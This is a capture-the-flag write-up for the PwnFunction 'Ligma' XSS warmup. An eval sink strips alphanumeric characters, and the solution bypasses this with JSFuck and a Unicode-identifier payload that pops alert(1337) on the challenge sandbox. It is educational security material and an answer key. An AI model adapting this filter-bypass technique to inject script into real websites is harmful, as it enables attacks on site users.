---
title: "XSS Game - Ligma | PwnFunction"
header: "Ligma"
challengeUrl: "https://sandbox.pwnfunction.com/warmups/ligma.html"
date: 2020-01-19T18:21:39+05:30
draft: false
type: warmup
difficulty: Easy
---

{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
{{</ rules >}}

{{< code >}}<code class="language-js">/* Challenge */
balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")
balls = balls.replace(/[A-Za-z0-9]/g, '')
eval(balls)</code>{{< /code >}}

{{< solution >}}
<p>The GET parameter <code>balls</code> ends up in <code>eval</code>, but the problem is that it
                        replaces all alphanumeric characters with an empty string like the following.
                        <pre
                            class="solution-code-block"><code class="language-js">balls = balls.replace(/[A-Za-z0-9]/g, '')</code></pre>
                        So we can use something like <a href="http://www.jsfuck.com/"><b>JSFuck</b></a>, which converts
                        your
                        javascript code into valid non-alphanumeric esoteric javascript.
                    </p>

                    <pre class="solution-code-block"><code class="language-js">/* URL Encoded */
"%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%5B(%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D((!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D)()"
                            
/* No Encoding */
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
</code></pre>
                    <p>Here's a shorter one</p>
                    <pre
                        class="solution-code-block"><code class="language-js">/* Shorter */
ᵥ=[];ᵤ=-~ᵥ;ᵞ=-~-~ᵤ;ᵠ=ᵥ+{};ᵨ=-~-~ᵞ;ᵅ=ᵠ[ᵨ];ᵈ=ᵠ[ᵤ];ᵡ=!!ᵥ+ᵥ;ᵜ=ᵡ[ᵤ+~ᵥ];ᵝ=ᵡ[ᵤ];ᵢ=!ᵥ+ᵥ;ᵣ=ᵥ[~ᵥ]+ᵥ;ᵥ[_=ᵅ+ᵈ+ᵣ[ᵤ]+ᵢ[ᵞ]+ᵜ+ᵝ+ᵣ[ᵤ+~ᵥ]+ᵅ+ᵜ+ᵈ+ᵝ][_](ᵢ[ᵤ]+ᵢ[-~ᵤ]+ᵢ[-~ᵞ]+ᵝ+ᵜ+`(${ᵤ+''+ᵞ+ᵞ+-~-~ᵨ})`)()</code></pre>
{{< /solution >}}